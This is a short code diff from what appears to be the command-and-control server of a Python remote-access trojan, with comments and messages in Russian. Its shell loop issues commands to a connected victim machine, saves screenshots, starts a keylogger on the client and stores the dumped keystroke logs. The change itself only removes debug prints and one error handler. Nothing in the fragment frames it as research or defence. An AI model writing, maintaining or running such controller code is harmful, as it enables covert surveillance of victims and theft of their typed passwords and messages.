@@ -120,19 +120,13 @@ def shell(target, ip):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
             elif command == "keylog_start":
-                print("[+] Кейлоггер запущен на клиенте.")
                 logging.info("[+] Кейлоггер запущен на клиенте.")
             elif command == "keylog_dump":
                 logs = reliable_recv(target)
-                print(f"Полученные логи: {logs}")  # Для отладки
                 save_keylogs(logs)
             else:
-                try:
-                    response = reliable_recv(target)
-                    print(response)
-                except Exception as e:
-                    logging.error(f"[!!] Ошибка получения ответа: {e}")
-                    break
+                response = reliable_recv(target)
+                print(response)
     except Exception as e:
         logging.error(f"[!!] Ошибка обработки клиента: {e}")
     finally:
